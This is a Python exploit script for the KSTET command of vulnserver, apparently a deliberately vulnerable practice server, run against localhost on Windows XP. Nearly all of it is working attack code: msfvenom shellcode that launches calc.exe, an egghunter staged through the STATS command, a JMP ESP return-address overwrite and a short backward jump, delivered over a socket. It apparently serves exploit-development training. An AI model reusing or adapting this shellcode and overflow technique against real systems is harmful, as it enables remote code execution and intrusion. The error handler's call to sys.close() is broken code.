#!/usr/bin/python
# Title: Vulnserver KSTET command - egghunter
# Target binary: vulnserver.exe
# Target system: Windows XP SP3

#--------------------------------------------------------------------------------------------------------#
# 1) sending the egg (w00tw00t) followed by the shellcode for calc.exe with the STATS command
# the STATS command allows for the storage of the entire shellcode
#--------------------------------------------------------------------------------------------------------#


#--------------------------------------------------------------------------------------------------------#
# --> overflowing the buffer:
# 1) reaching the instruction pointer after 70 bytes:
#       - adding 25 nops for padding;
#       - dropping the egghunter shellcode;
#       - filling the remaining buffer space with nops to reach the EIP;
# 2) overwriting the EIP with --> JMP ESP from essfunc.dll;
# 3) adding 4 nops for padding;
# 4) performing a 70-byte short jump backwards and landing into the buffer space (nops at the beginning)
# 5) execution of the egghunter - searching for the egg - executing dropped shellcode
#--------------------------------------------------------------------------------------------------------#


import socket
import sys

shellcode = "\xb8\x32\xe1\x40\x40\xd9\xeb\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
shellcode += "\x31\x31\x42\x13\x03\x42\x13\x83\xc2\x36\x03\xb5\xbc\xde\x41"
shellcode += "\x36\x3d\x1e\x26\xbe\xd8\x2f\x66\xa4\xa9\x1f\x56\xae\xfc\x93"
shellcode += "\x1d\xe2\x14\x20\x53\x2b\x1a\x81\xde\x0d\x15\x12\x72\x6d\x34"
shellcode += "\x90\x89\xa2\x96\xa9\x41\xb7\xd7\xee\xbc\x3a\x85\xa7\xcb\xe9"
shellcode += "\x3a\xcc\x86\x31\xb0\x9e\x07\x32\x25\x56\x29\x13\xf8\xed\x70"
shellcode += "\xb3\xfa\x22\x09\xfa\xe4\x27\x34\xb4\x9f\x93\xc2\x47\x76\xea"
shellcode += "\x2b\xeb\xb7\xc3\xd9\xf5\xf0\xe3\x01\x80\x08\x10\xbf\x93\xce"
shellcode += "\x6b\x1b\x11\xd5\xcb\xe8\x81\x31\xea\x3d\x57\xb1\xe0\x8a\x13"
shellcode += "\x9d\xe4\x0d\xf7\x95\x10\x85\xf6\x79\x91\xdd\xdc\x5d\xfa\x86"
shellcode += "\x7d\xc7\xa6\x69\x81\x17\x09\xd5\x27\x53\xa7\x02\x5a\x3e\xad"
shellcode += "\xd5\xe8\x44\x83\xd6\xf2\x46\xb3\xbe\xc3\xcd\x5c\xb8\xdb\x07"
shellcode += "\x19\x36\x96\x0a\x0b\xdf\x7f\xdf\x0e\x82\x7f\x35\x4c\xbb\x03"
shellcode += "\xbc\x2c\x38\x1b\xb5\x29\x04\x9b\x25\x43\x15\x4e\x4a\xf0\x16"
shellcode += "\x5b\x29\x97\x84\x07\x80\x32\x2d\xad\xdc"
# msfvenom -p windows/exec cmd=calc.exe -a x86 -b "\x00" -f c

egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
# egg: w00t

payload = "\x90"*25
payload += egghunter
payload += "\x90"*(70-len(payload))
payload += "\xaf\x11\x50\x62"   # 0x625011AF - JMP ESP - essfunc.dll
payload += "\x90"*4
payload += "\xeb\xba\x90\x90"   # jmp short backwards - 70 bytes


try:
    r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    r.connect(("127.0.0.1", 9999))
    print r.recv(1024)
    r.send("STATS " + "w00tw00t" + shellcode)
    print r.recv(1024)
    r.close()

#-------------------------------------------------------------#
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 9999))
    print s.recv(1024)
    s.send("KSTET " + payload)
    print s.recv(1024)
    s.close()

except:
    print "[-] Error connecting to target. Exiting..."
    sys.close()
